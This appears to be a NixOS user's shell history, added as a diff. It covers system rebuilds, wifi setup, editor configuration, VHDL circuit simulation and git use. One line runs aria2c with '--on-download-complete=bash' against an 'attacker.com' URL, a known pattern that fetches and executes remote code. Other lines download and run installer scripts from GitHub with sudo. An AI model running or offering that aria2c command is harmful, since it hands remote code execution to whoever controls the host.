+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+cd nix-node
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+rm-rf package-lock.json
+rm -rf package-lock.json
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls
+cd src
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+ps -eaf | grep nu 
+lsblk -eaf | grep nu 
+lsblk
+nmcli
+ls
+nmcli wifi connect
+nmcli wifi
+nmcli connect wifi
+nmcli connect 
+nmcli connect hmm
+nmcli connect device
+clear
+nmcli device wifi connect "hmm"      
+nmcli device wifi
+nmcli device wifi connect "hmm"      
+cd ~/projects
+ls
+cd chikocad
+ls
+vim .
+wine
+cd ~/projects/sequence/sequence
+nmcli device wifi connect "hmm"      
+nmcli device wifi 
+nmcli device wifi connect "hmm"      
+nmcli device wifi
+cd ~/.config/nvim
+ls
+vim .
+vi .
+cd ..
+cd kitty
+ls
+vi .
+cd ~/projects
+ls
+cd sequence/sequence
+vi .
+cd ~/.config/nvim
+vi .
+flathub 
+cd /etc/nixos
+flatpak upgrade
+sudo nixos-rebuild switch --upgrade
+sudo vi .
+sudo nixos-rebuild switch --upgrade
+sudo vi .
+sudo nixos-rebuild switch --upgrade
+sudo vi .
+sudo nixos-rebuild switch --upgrade
+sudo vi .
+sudo nixos-rebuild switch --upgrade
+cd /etc/nixos
+sudo vi .
+sudo nixos-rebuild switch --upgrade
+curl https://github . com/RGBCube.keys
+curl https://github.com/RGBCube.keys
+sudo nixos-rebuild switch --upgrade
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+helix
+hc
+hx
+cd ~/.config/nvim
+cd ..
+cd kitty
+ls
+hx 
+cd ~/.config/nvim
+ls
+cd ..
+neofetch
+hc
+cd ~/projects/sequence/sequence
+ls
+vim .
+hx
+cd ~/.config/kitty
+hx .
+ls
+hx
+hx 
+cd ~/projects/sequence/sequence/ls
+cd ~/projects/sequence/sequence/
+ls
+hx .
+cd ~/.config/kitty
+ls
+hx .
+neofetch
+ls
+cd ~/.config/kitty
+hx .
+neofetch
+hx
+neofetch
+ls
+kitty +kitten themes
+neofetch
+nerdfecth
+nerdfetch
+fetch
+ferris-fetch
+cd /etc/nixos
+ls
+pfetch
+neofetch
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+fetch
+pfetch
+clea
+clear
+hx
+hx .
+cd ~/projects/sequence/sequence/
+ls
+hx .
+pfetch
+cd ~/.config/hypr
+ls
+hx .
+thunar .
+cd /etc/nixos
+ls
+sudo hx .
+thunar .
+cd ~/projects
+ls
+vim
+ls
+cd NIXCF/
+ls
+git add .
+git commit -m hyprlast
+git status
+git push 
+cd /etc/nixos
+sudo hx .
+code .
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd /etc/nixos
+sudo hx
+reboot
+cd /etc/nixos
+:q
+pfecth
+pfetch
+cd ~/.config
+ls
+cd i3
+ls
+vim .
+cds i3
+cd ~/.config/i3
+ls
+hx .
+vim .
+zed
+zed-editor
+cd ~/.config
+ls
+cd nu
+cd nushell/
+ls
+zed
+Zed
+cd /etc/nixos
+ls
+hx .
+zed
+nix search zed
+nix search zed-editor
+sudo hx .
+nix-env -qaP | grep zed
+zed
+nix search zed
+cd /etc/nixos
+thunar .
+thunar
+ls
+clea
+rclear
+clear
+pfetch
+hx
+cd ~/projects
+ls
+cd chikocad/
+ls
+hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+sudo hx .
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+hx .
+hx 
+cd /etc/nixos
+sudo hx .
+sudo nix
+sudo nixos-rebuild switch --upgrade
+pfetch
+hx
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+neofetch
+cd /etc/nixos
+ls
+cd /etc/nixos
+cd /.config
+cd ~/.config/i3
+sudo nixos-rebuild switch --upgrade
+sudo rm /nix/store/*.lock
+sudo rm -rf /nix/store/*.lock
+nix-store --gc<\n>nix-store --optimize
+sudo rm -rf /nix/store/*.lock
+sudo nixos-rebuild switch --upgrade
+pfetch
+cd /.config
+cd /etc/nixos
+ls
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+nsofetch
+neofetch
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+sudo hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+ls
+hx .
+;q
+cd ~/.config/i3wm
+cd ~/.config/i3
+ls
+cd .
+cd ..
+cd i3bar
+cd i3status
+i3status
+locate i3status
+find i3status
+fzf
+nmcli
+nmcli device wifi
+nmcli device wifi connect "hmm"      
+hx --health markdown
+hx --health
+hx --health rust
+hx --health nix
+hx --health zig
+cd /etc/nixos
+sudo hx .
+hx --health markdown
+sudo hx .
+hx --health markdown
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd $HOME
+cd $home
+cd 
+ls
+thunar .
+mkdir notes
+cd notes
+hx SNSESEmd
+hx SNSESE.md
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd ~/.config
+cd i3
+hx .
+locate i3
+locate i3status
+cd 
+cd ~/.config
+cd i3
+cd .
+cd ..
+ls
+i3status
+i3status -c --config 
+i3status -c 
+cd /run/current-system/sw/bin/i3status
+cd /run/current-system/sw/bin
+ls
+hx i3status
+cd ~
+touch i3status.conf
+hx i3status.conf
+nix-locate i3status
+which i3status
+which i3statusconf
+which i3status.conf
+which .i3status
+which .i3status.conf
+which /.i3status.conf
+which ~/.i3status.conf
+cd ~/.config
+ls
+which ~/.i3status.conf
+which i3status.conf
+cd /etc/i3status
+fzf
+nix-shell
+i3status 
+i3status --config
+i3status --config .
+i3status [-c configfile] [-h] [-v] [--run-once]
+i3status -h
+cd /run/current-system/sw/bin
+ls
+hx i3status
+cd ..
+yazi
+cd ~/.config
+neofetch
+sudo curl -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt-linux -o /usr/local/bin/tt && sudo chmod +x /usr/local/bin/tt<\n>sudo curl -o /usr/share/man/man1/tt.1.gz -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt.1.gz
+sudo curl -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt-linux -o /usr/local/bin/tt && sudo chmod +x /usr/local/bin/tt<\n>sudo curl -o /usr/share/man/man1/tt.1.gz -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt.1.gz;
+sudo curl -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt-linux -o /usr/local/bin/tt && sudo chmod +x /usr/local/bin/tt
+cd projects/cloned
+cd projects/clones
+# debian dependencies<\n>sudo apt install golang<\n><\n># clone and make<\n>git clone https://github.com/lemnos/tt<\n>cd tt<\n>make && sudo make install
+sudo curl -L https://github.com/lemnos/tt/releases/download/v0.4.2/tt-linux -o /usr/local/bin/tt and sudo chmod +x /usr/local/bin/tt
+tt
+<\n># clone and make<\n>git clone https://github.com/lemnos/tt<\n>cd tt<\n>make and sudo make install
+make
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+ls
+cd tt<\n>::: make and sudo make install
+cd ttmake and sudo make install
+cd tt
+make and sudo make install
+make : sudo make install
+make ; sudo make install
+tt
+mantt
+man tt
+man rust
+man rustc
+MAN C
+man c
+man clng
+man clang
+man gcc
+make
+make install
+sudo make install
+tt
+ls
+tt -quotes en
+sudo hx .
+tt -quotes en
+sudo nixos-rebuild switch --upgrade
+hx --health go
+cd projects/clones/tt
+hx .
+pfetch
+cd notes
+ls
+cd notes
+ls
+hx SNS_STUDYPLAN.md
+ls
+SNS_STUDYPLAN.md
+yzi .
+yazi .
+cd notes
+ls
+hx SNS_STUDYPLAN.md
+journalctl 
+journalctl ls
+journalctl SNS_STUDYPLAN.md
+nmcli
+nmcli wifi
+nmcli device wifi disconnect
+nmcli device wifi list
+nmcli device wifi connect
+nmcli device wifi disconnect
+nmcli device wifi --help
+nmcli device disconnect
+nmcli device --help
+nmcli device disconnect
+nmcli device disconnect "Panchsheel_Niwas 5G"
+nmcli device wifi list
+nmcli device disconnect "Panchsheel_Niwas 5G"
+nmcli device disconnect list
+nmcli device list
+nmcli device --help
+nmcli device status
+nmcli device disconnect wlp0s20f3
+nmcli device wifi connect wlp0s20f3
+nmcli device wifi connect "Panchsheel_Niwas 5G"
+nmcli device wifi connect wlp0s20f3
+nmcli device disconnect wlp0s20f3
+nmcli device wifi connect "Panchsheel_Niwas 5G"
+cd notes
+cd /etc/nixos
+ls
+nvidia
+htop
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo lshw -c display
+nouveau
+nix shell nixpkgs#pciutils -c lspci | grep ' VGA '
+sudo hx .
+hx .
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+hx .
+nvtop
+nix shell nixpkgs#pciutils -c lspci | grep ' VGA '
+sudo lshw -c display
+sudo hx .
+sudo hx ./modules/nvidia.nix
+sudo nixos-rebuild switch --upgrade
+sudo hx ./modules/nvidia.nix
+rm -rf ./modules/nvidia.nix
+sudo rm -rf ./modules/nvidia.nix
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx ./modules/nvidia.nix
+sudo nixos-rebuild switch --upgrade
+sudo hx ./modules/nvidia.nix
+nvtop
+:q
+htop
+sudo hx ./modules/nvidia.nix
+sudo rm -rf ./modules/nvidia.nix
+sudo hx .
+neofetch
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+reboot
+neofetch
+pfetch
+nvtop
+cd notes
+cat SNS_STUDYPLAN.md
+cd /etc/nixos
+sudo hx .
+:wq
+sudo nixos-rebuild switch --upgrade
+cd ~/notes
+mdcat
+mdcat SNS_STUDYPLAN.md
+nmcli device disconnect wlp0s20f3
+nmcli device wifi connect "Panchsheel_Niwas 5G"
+nvtop
+cd notes
+ls
+hx 24Nov.md
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+xflux
+/run/current-system/sw/bin/xflux -z
+xflux -z
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sct 3000
+sct 1000
+sct 0
+sct 3000
+sct 2000
+sct 8000
+sct 4500
+sct 8000
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd Downloads
+ls
+yazi
+chmod +x ModelSimSetup-16.1.0.196.run
+chmod +x ModelSimSetup-16.1.0.196-linux.run
+./ModelSimSetup-13.1.0.162.run install Modelsim
+./ModelSimSetup-13.1.0.162-linux.run install Modelsim
+./ModelSimSetup-16.1.0.196-linux.run install Modelsim
+cd ~/intelFPGA/16.1/modelsim_ase/bin
+cd ..
+ls
+cd ..
+ls
+cd Downloads/
+ls
+which intelFPGA
+which modelsim
+which modelsim_ase
+sudo nixos-rebuild switch
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cd ~/projects
+mkdir ghdl-circuits
+cd ghdl-circuits/
+hx .
+hello.vhdl
+hx hello.vhdl
+ghdl -a hello.vhdl<\n>
+ghdl -e hello_world<\n><\n>
+ls
+ghdl -e hello_world<\n><\n>
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+cd ~/projects/ghdl-circuits/
+ghdl -e hello_world
+lz
+zlib
+ghdl -e hello_world
+ghdl -r hello_world
+./hello_world
+ls
+git init
+git add .
+git commit -m "less go vhdl"
+git remote add origin main
+git push
+git push --set-upstream origin master
+git remote add origin https://github.com/chiqorein/ghdl-circuits.git
+git remove remove
+git remote remove
+git remote remove main
+git remote delete
+git remote set-head git remote add origin
+git remote set-head https://github.com/chiqorein/ghdl-circuits.git
+git remote set-head https://github.com/chiqorein/ghdl-circuits.git master
+git remote set-url origin https://github.com/chiqorein/ghdl-circuits.git<\n>
+git push
+git push --set-upstream origin master<\n>
+sudo hx .
+cd ~/projects/
+cd ghdl-circuits/
+sudo nixos-rebuild switch
+mkdir full_adder
+cd full_adder/
+sudo hx .
+sudo hx adder_tb.vhdl
+ghdl -a adder_tb.vhdl
+hx .
+hx adder.vhdl
+ghdl -a adder.vhdl
+ghdl -a adder_tb.vhdl
+ghdl -e adder_tb
+nix-shell -e zlib
+nix-shell -a zlib
+zlib
+sudo hx .
+zlib
+ghdl -e adder_tb
+ghdl -r adder_tb
+ghdl -r adder_tb --vcd=adder.vcd
+gtkwave adder.vcd
+ls
+cd ..
+ls
+tree
+mkdir jkff
+cd jkff/
+ls
+hx jkff.vhdl
+sudo -a jkff.vhdl
+ghdl -a jkff.vhdl
+cd ..
+rm -rf jkff
+mkdir siso
+cd siso
+hx siso.vhdl
+ghdl -a siso.vhdl
+hx siso.vhdl
+ghdl siso.vhdl
+ls
+ghdl siso.vhdl
+ghdl -a siso.vhdl
+ghdl -e siso
+ghdl -r siso
+ls
+gtkwave siso.vcd
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl<\n><\n># Elaborate testbench<\n>ghdl -e siso_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r siso_tb --vcd=siso.vcd --stop-time=100ns
+ls
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl<\n><\n># Elaborate testbench<\n>ghdl -e siso_tb
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl
+# Analyze both files<\n>ghdl -a siso.vhdl
+ghdl -a siso_tb.vhdl
+hx siso_tb.vhdl
+ghdl -a siso_tb.vhdl
+ghdl -e siso_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r siso_tb --vcd=siso.vcd --stop-time=100ns
+gtkwave siso.vcd
+hx .
+ghdl -a siso.vhdl
+hx .
+ghdl -a siso.vhdl
+ghdl -a siso_tb.vhdl
+hx .
+ghdl -a siso_tb.vhdl
+gtkwave siso.vcd
+ghdl -e siso_tb.vhdl
+ls
+hx .
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl<\n><\n># Elaborate testbench<\n>ghdl -e siso_tb
+gtkwave siso.vcd
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl<\n><\n># Elaborate testbench<\n>ghdl -e siso_tb
+# Analyze both files<\n>ghdl -a siso.vhdl<\n>ghdl -a siso_tb.vhdl<\n><\n># Elaborate testbench<\n>ghdl -e siso_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r siso_tb --vcd=siso.vcd --stop-time=100ns
+gtkwave siso.vcd
+ls
+tree
+cd ..
+tree
+git add .
+git commit -m
+git commit -m maymay
+git push
+hx --health vhdl
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+hx --health
+sudo hx .
+sudo nixos-rebuild switch
+cd ~/notes
+cd projects/
+cd ghdl-circuits/
+ls
+mkdir basics
+mv full_adder asics
+mv full_adder basics
+ls
+cd basics
+mkdir 2to4dec
+cd 2to4dec/
+hx dec.vhdl
+hx dec_to.vhdl
+hx dec_tb.vhdl
+ghdl -a dec.vhdl
+ghdl -a dec_tb.vhdl
+ghdl -e dec_tb
+ghdl -r dec_tb --vcd=dec_wave.vcd --stop-time=500ns
+gtkwave dec_wave.vcd
+cd ..
+mkdir 4to1mux
+hx mux.vhdl
+hx mux_tb.vhdl
+ghdl -a mux.vhdl
+ghdl -a mux_tb.vhdl
+ghdl -e mux_tb
+hx .
+tree
+thunar .
+cd 4to1mux/
+ghdl -e mux_tb
+ghdl -a mux.vhdl
+ghdl -a mux_tb.vhdl
+ls
+hx x.
+hx .
+thunar .
+ghdl -a mux4to1_tb.vhdl
+ghdl -a mux4to1.vhdl
+thunar .
+ghdl -a mux4to1.vhdl
+ghdl -a mux4to1_tb.vhdl
+ghdl -e mux4to1_tb
+gtkwave mux_wave.vcd
+cd //
+..
+ls
+cd projects
+cd ~/projects
+l
+cd ghdl-circuits/
+cd basics/
+ls
+mkdir parallel_add
+cd parallel_add/
+ls
+hx parallel_adder.vhdl
+hx parallel_adder_tb.vhdl
+ghdl -a parallel_adder_tb.vhdl
+ghdl -a parallel_adder.vhdl
+ghdl -e parallel_adder_tb
+gtkwave adder_wave.vcd
+ls
+cd ..
+ls
+mkdir sr_latch
+cd sr_latch/
+hx srlatch.vhdl
+hx srlatch_tb.vhdl
+ghdl -a srlatch.vhdl
+ghdl -a srlatch_tb.vhdl
+ghdl -e srlatch_tb
+ghdl -r srlatch_tb --vcd=srlatch_wave.vcd --stop-time=800ns
+gtkwave srlatch_wave.vcd
+ls
+cd ..
+ls
+cd siso
+ls
+cd ..
+mkdir jkff
+cd jkff/
+h jk1.vhdl
+hx jk1.vhdl
+hx jk1_tb.vhdl
+ghdl -a jk1.vhdl
+ghdl -a jk1_tb.vhdl
+ghdl -e jk1_tb
+ghdl -r jk1_tb --vcd=jk_wave.vcd --stop-time=2000ns<\n>gtkwave jk_wave.vcd
+hx .
+ls
+cd ..
+mkdir sipo
+cd sipo
+ls
+hx sipo.vhdl
+hx sipo_tb.vhdl
+ghdl -a sipo.vhdl
+ghdl -a sipo_tb.vhdl
+ghdl -e sipo_tb<\n>ghdl -r sipo_tb --vcd=sipo_wave.vcd --stop-time=3000ns<\n>gtkwave sipo_wave.vcd
+cd ..
+ls
+cd updown
+mkdir updown
+cd updown
+cd ..
+mkdir piso
+cd piso
+hc piso.vhdl
+hx piso.vhdl
+hx piso_tb.vhdl
+ghdl -a piso.vhdl
+ghdl -a piso_tb.vhdl
+ghdl -e piso_tb
+gtkwave piso_wave.vcd
+cd ..
+cd updown/
+hx updown_count.vhdl
+hx updown_count_to.vhdl
+hx updown_count_tb.vhdl
+# Analysis<\n>ghdl -a updown_count.vhd<\n>ghdl -a updown_count_tb.vhd<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcd<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcd
+ls
+# Analysis<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcdl<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcdl
+hx updown_count.vhdl
+# Analysis<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcdl<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcdl
+ghdl -a updown_count.vhdl
+ghdl -a updown_count_tb.vhdl
+ghdl -e updown_count_tb
+hx updown_count_tb.vhdl
+# Analysis<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcdl<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcdl
+# Analysis<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcd<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcd
+# First, clean any existing compiled files (optional but recommended)<\n>ghdl --clean<\n>rm -f *.vcd *.vcdl<\n><\n># Then run the commands in sequence<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n>ghdl -e updown_count_tb<\n>ghdl -r updown_count_tb --vcd=updown_count.vcd   # Note: .vcd NOT .vcdl<\n>gtkwave updown_count.vcd
+ghdl -r updown_count_tb --vcd=updown_count.vcd
+cat updown_count.vhdl<\n>cat updown_count_tb.vhdl
+ls
+# First, clean any existing compiled files (optional but recommended)<\n>ghdl --clean<\n>rm -f *.vcd *.vcdl<\n><\n># Then run the commands in sequence<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n>ghdl -e updown_count_tb<\n>ghdl -r updown_count_tb --vcd=updown_count.vcd   # Note: .vcd NOT .vcdl<\n>gtkwave updown_count.vcd
+thunar .
+# Analysis<\n>ghdl -a updown_count.vhdl<\n>ghdl -a updown_count_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e updown_count_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r updown_count_tb --vcd=updown_count.vcd<\n><\n># Open waveform in GTKWave<\n>gtkwave updown_count.vcd
+cd ..
+cd mod10
+mkdir mod10
+cd mod10
+hx mod10_counter.vhdl
+hx mod10_counter_tb.vhdl
+ghdl -a mod10_counter.vhdl<\n>ghdl -a mod10_counter_tb.vhdl<\n><\n># Elaborate<\n>ghdl -e mod10_counter_tb<\n><\n># Run simulation and generate VCD file<\n>ghdl -r mod10_counter_tb --vcd=mod10_counter.vcd<\n><\n># Open waveform in GTKWave<\n>gtkwave mod10_counter.vcd
+ghdl -r mod10_counter_tb --vcd=mod10_wave.vcd --stop-time=800ns
+ls
+cd ..
+ls
+cd ..
+git add .
+cd ..
+ls
+cd ghdl-circuits/
+git statusd
+git status
+code .
+git status
+git pull
+git push
+git status
+git push
+git push --set-upstream origin master
+echo '*.vcd' >> .gitignore<\n>git add .gitignore<\n>git commit -m "Ignore .vcd files"<\n>
+touch .gitignore
+echo '*.vcd' >> .gitignore<\n>git add .gitignore<\n>git commit -m "Ignore .vcd files"<\n>
+ls
+git push
+thunar .
+hx .
+hx .gitignore
+cd mod10
+cd basic
+cd basics
+ls
+cd mod10/
+echo '*.vcd' >> .gitignore<\n>git add .gitignore<\n>git commit -m "Ignore .vcd files"<\n>
+touch .gitignore
+hx .
+echo '*.vcd' >> .gitignore
+cd ..
+git push
+git add .
+git commir -m hehe
+git commit -m hehe
+giot push
+git push
+git add .
+git commit -m hehe
+git push
+git lfs install<\n>git lfs track '*.vcd'<\n>git add .gitattributes<\n>git commit -m "Track .vcd files with Git LFS"<\n>
+nix-env -iA nixpkgs.bfg-repo-cleaner<\n>
+nix profile -iA nixpkgs.bfg-repo-cleaner<\n>
+nix profile nixpkgs.bfg-repo-cleaner<\n>
+cd projects/ghdl-circuits/
+git reset --soft HEAD~1<\n>
+git reset --soft HEAD~N<\n>
+git reset --soft HEAD~3<\n>
+git status
+git push
+git branches
+git branch
+git push origin HEAD:master
+cd projects/ghdl-circuits/
+ls
+cd basics
+ls
+cd 2to4dec/
+hx .
+gghdl -r dec_tb --vcd=dec_wave.vcd --stop-time=500ns<\n>gtkwave dec_wave.vcd
+ghdl -r dec_tb --vcd=dec_wave.vcd --stop-time=500ns<\n>gtkwave dec_wave.vcd
+ls
+cd ..
+ls
+cd 4to1mux/
+hx .
+ghdl -r mux4to1_tb --vcd=mux_wave.vcd --stop-time=800ns<\n>gtkwave mux_wave.vcd
+cd ..
+ls
+cd full_adder/
+ls
+ghdl -r adder_tb --vcd=adder.vcd
+gtkwave adder.vcd<\n>
+hx .
+cd ..
+ls
+cd jkff/
+ls
+hx jk1.vhdl
+ghdl -r jk1_tb --vcd=jk_wave.vcd --stop-time=2000ns<\n>gtkwave jk_wave.vcd
+cd ..
+ls
+cd mod10
+ls
+hx .
+ghdl -r mod10_counter_tb --vcd=mod10_counter.vcd<\n><\n># Open waveform in GTKWave<\n>gtkwave mod10_counter.vcd
+cd ..
+ls
+cd parallel_add/
+hx .
+ghdl -r parallel_adder_tb --vcd=adder_wave.vcd --stop-time=1200ns<\n>gtkwave adder_wave.vcd
+cd .. ls
+cd ..
+ls
+cd piso
+cd PISO
+hx .
+ghdl -r piso_tb --vcd=piso_wave.vcd --stop-time=3000ns<\n>gtkwave piso_wave.vcd
+cd ..
+ls
+cd sipo
+ls
+hx .
+ghdl -r sipo_tb --vcd=sipo_wave.vcd --stop-time=3000ns<\n>gtkwave sipo_wave.vcd
+ls
+cd ..
+ls
+cd siso
+hx .
+cd ..
+ls
+cd sr_latch/
+ls
+hx .
+ghdl -r srlatch_tb --vcd=srlatch_wave.vcd --stop-time=800ns<\n>gtkwave srlatch_wave.vcd
+cd ..
+ls
+cd updown/
+cd projects/ghdl-circuits/basics
+ls
+sct 8000
+curl -L https://raw.githubusercontent.com/cryinkfly/Autodesk-Fusion-360-for-Linux/main/files/setup/autodesk_fusion_installer_x86-64.sh -o "autodesk_fusion_installer_x86-64.sh" && chmod +x autodesk_fusion_installer_x86-64.sh && ./autodesk_fusion_installer_x86-64.sh --install --default
+cd //
+cd /etc/nixos
+ls
+sudo hx 
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+sct 8000
+sct 1000
+sct 8000
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+sct 1000
+sct 800
+sct 1200
+sct 4000
+sct 3000
+sct 4000
+sct 8000
+cd projects/
+ls
+mkdir aiml
+cd ai
+cd aiml/
+ls
+touch extract.py
+hx .
+:wq
+flatpak install flathub com.rtosta.zapzap
+flatpak uninstall zapzap
+flatpak upgrade
+sct 8000
+aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
+nix-shell -p aria2c
+hx .
+hx haskel
+hx haskel.hx
+hx haskel.hs
+hx haskel.lhs
+hx haskel.hs
+Iosevka
+iosevka
+cd /etc/nixos
+sudo hx .
+iosevka
+sudo hx .
+sudo
+sudo nixos-rebuild switch --upgrade
+nerdfetch
+pfetch
+neofetch
+sudo hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+sudo hx .
+cd /etc/nixos
+sudo hx .
+hx jadn
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+pfetch
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+neofetch
+hx .
+hx janwd.hs
+cd ~/.config/i3
+hx .
+thunar .
+cd Downloads/
+ls
+gzip /home/chikoyeat/Downloads/drive-download-20241202T120646Z-001.zip
+gzip
+gzip -h 
+zip 
+^zip 
+unzip /home/chikoyeat/Downloads/drive-download-20241202T120653Z-001.zip
+cd Documents/
+cd me2
+unzip drive-download-20241202T121423Z-001.zip
+unzip /home/chikoyeat/Documents/me2/drive-download-20241202T121423Z-001.zip
+cd ~/downloads
+cd ~/Downloads/
+ls
+mv /home/chikoyeat/Downloads/drive-download-20241202T121621Z-001.zip ~/Documents/me2
+unzip /home/chikoyeat/Documents/me2/drive-download-20241202T121621Z-001.zip
+cd ~/Documents/
+cd me2
+unzip /home/chikoyeat/Documents/me2/drive-download-20241202T121621Z-001.zip
+sct 8000
+cd /etc/nixos
+thunar .
+cd projects
+cd ~/projects
+ls
+cd NIXCF/
+ls
+git branch
+git branch master
+git 
+git checkout master
+ls
+git branch
+git fetch
+git branch
+git pull
+git checkout i3(default)
+cd ..
+rm -rf NIXCF
+git clone https://github.com/chiqorein/NIXCF
+cd NIXCF/
+ls
+git branch
+git checkout hyprland
+git branch
+git checkout i3(default)
+git checkout "i3(default)"
+ls
+thunar .
+ls
+git add .
+git commit -m i3
+git push
+cd ~/.config
+cd i3
+ls
+thunar .
+thunar .
+git add .
+git commit -m dot
+git push
+git checkout xmonad
+git fetch
+git checkout xmonad
+git status
+cd /etc/nixos
+sudo hx .
+ls
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd projects/
+cd clones/
+git clone https://github.com/mrcjkb/.xmonad.git
+cd .xmonad/
+nix develop .
+cd /etc/nixos
+ls
+cd fetch
+git status
+sudo hx .
+cd ~/.monad
+mkdir ~/.monad
+cd ~/.monad
+ls
+hx xmonad.hs
+sudo nixos-rebuild switch --upgrade
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+cd ~/.monad
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+hx ~/.monad/xmonad.hs
+sudo hx .
+cd ../.monad
+cd .../.monad
+cd .../
+ls
+cd /etc/nixos
+cd ../
+cd /etc/nixos
+cd .../home/.monad
+cd .../home/
+ls
+cd .../home/chikoyeat
+cd .monad
+cd /etc/nixos
+hx .
